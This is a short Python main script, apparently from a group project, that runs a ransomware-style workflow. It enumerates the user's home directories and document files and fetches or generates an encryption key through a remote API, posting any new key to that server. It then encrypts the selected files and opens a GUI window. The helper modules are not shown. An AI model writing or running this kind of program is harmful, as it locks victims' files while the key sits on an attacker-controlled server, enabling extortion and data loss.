import screens.home_screen as home_screen
import services.get_dirs as get_dirs
import services.get_files as get_files
import services.api_services as api
import encrypt.encrypt_file as enc


# get file
all_dirs = get_dirs.get_home_dirs()
all_files = get_files.get_all_files(all_dirs[0])
all_txt_files = get_files.get_txt_files()
all_docx_files = get_files.get_docx_files()
all_nhom1_files = get_files.get_nhom1_files()

# api to connect data retool
node = api.get_node()

# get key from data
key = api.get_key(node=node)

if key == 'NA':
  key = enc.get_key()
  status = api.post_key(node=node, key=key)
  print(status)
else:
  for f in all_nhom1_files:
    enc.enc(filename=f, key=key)

home_screen = home_screen.main_window
home_screen.mainloop()